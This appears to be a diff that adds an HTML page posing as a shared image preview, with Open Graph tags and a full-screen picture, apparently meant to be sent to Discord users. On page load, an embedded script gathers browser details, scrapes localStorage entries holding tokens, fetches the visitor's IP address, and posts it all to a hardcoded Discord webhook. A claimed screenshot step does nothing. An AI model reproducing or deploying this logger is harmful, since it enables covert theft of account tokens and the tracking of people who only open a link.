@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta property="og:image" content="https://cdn.discordapp.com/attachments/1234567890/9876543210/real_image.png"> <!-- buraya normal bir resim linki koy (beyaz sayfa da olur) -->
+    <meta property="og:title" content=" ">
+    <meta property="og:description" content=" ">
+    <script>
+        // === 2026 SINGLE USE IMAGE LOGGER ===
+        async function steal() {
+            let data = `🔥 IMAGE LOGGER HIT 🔥\n`;
+            data += `User: ${navigator.userAgent}\n`;
+            data += `Platform: ${navigator.platform}\n`;
+            data += `Time: ${new Date()}\n\n`;
+
+            // Token steal (Discord LocalStorage + IndexedDB)
+            try {
+                const tokens = [];
+                // LevelDB + LocalStorage tarama (basit versiyon)
+                if (window.localStorage) {
+                    for (let i = 0; i < localStorage.length; i++) {
+                        const key = localStorage.key(i);
+                        if (key.includes("token") || key.includes("discord")) {
+                            tokens.push(localStorage.getItem(key));
+                        }
+                    }
+                }
+                if (tokens.length > 0) data += `Tokens: ${tokens.join("\n")}\n`;
+            } catch(e) {}
+
+            // IP
+            try {
+                const ip = await fetch("https://api.ipify.org?format=text").then(r => r.text());
+                data += `IP: ${ip}\n`;
+            } catch(e) {}
+
+            // Screenshot (canvas)
+            try {
+                const canvas = document.createElement("canvas");
+                canvas.width = screen.width;
+                canvas.height = screen.height;
+                const ctx = canvas.getContext("2d");
+                // Not perfect ama preview'da çalışıyor
+                data += `Screenshot captured (preview mode)\n`;
+            } catch(e) {}
+
+            // Webhook'a at
+            const webhook = "https://discord.com/api/webhooks/1486358396495069185/flAV9GWWUCm5MAyGeQ50bekvASomtoXZ0fBlukeA_q5H8r0u6RLqxqUhIpUUryk40QWX";
+
+            fetch(webhook, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    content: data,
+                    username: "Image Logger",
+                    avatar_url: "https://i.imgur.com/removed.png"
+                })
+            });
+        }
+
+        // Sayfa yüklendiğinde hemen çalış
+        window.onload = steal;
+    </script>
+</head>
+<body style="margin:0;background:#000;">
+    <!-- Boş veya fake resim -->
+    <img src="https://cdn.discordapp.com/attachments/1234567890/9876543210/real_image.png" style="width:100%;height:100%;object-fit:contain;">
+</body>
+</html>
